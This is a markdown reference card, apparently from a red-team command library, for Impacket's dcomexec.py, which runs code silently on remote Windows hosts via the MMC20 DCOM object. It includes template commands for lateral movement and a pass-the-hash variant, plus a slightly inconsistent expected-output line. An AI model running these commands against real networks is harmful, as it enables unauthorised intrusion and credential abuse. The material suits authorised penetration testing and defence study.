---
type: command
executor: bash
data: 'dcomexec.py -share C$ -object MMC20 ''DOMAIN/USERNAME:PASSWORD@TARGET_HOST'''
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - lateral-movement
  - dcom
verified: true
validated: true
---

# DCOMExec Silent Execution

## Command

```bash
dcomexec.py -share C$ -object MMC20 'DOMAIN/USERNAME:PASSWORD@TARGET_HOST'
```

## Description

This command uses Impacket's dcomexec.py to silently execute a DCOM instantiation on a remote Windows host without retrieving output, ideal for stealthy testing of connectivity and access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -share C$ | Specifies the admin share (C$) for connection | Yes |
| -object MMC20 | Instantiates the MMC20.Application COM object | Yes |
| DOMAIN/USERNAME:PASSWORD@TARGET_HOST | Authentication credentials and target hostname/IP | Yes |

## Examples

### Basic Usage

```bash
dcomexec.py -share C$ -object MMC20 'EXAMPLE/USER:PASS@192.168.1.100'
```

### With Hashes

```bash
dcomexec.py -share C$ -object MMC20 -hashes LMHASH:NTHASH 'DOMAIN/USER@TARGET_HOST'
```

## Expected Output

Minimal output indicating successful connection and object instantiation, e.g., "[+] Retreived output". No command results are shown due to silent mode.

## Related

- [[procedures/dcom-lateral-movement]]
- [[tools/Impacket]]
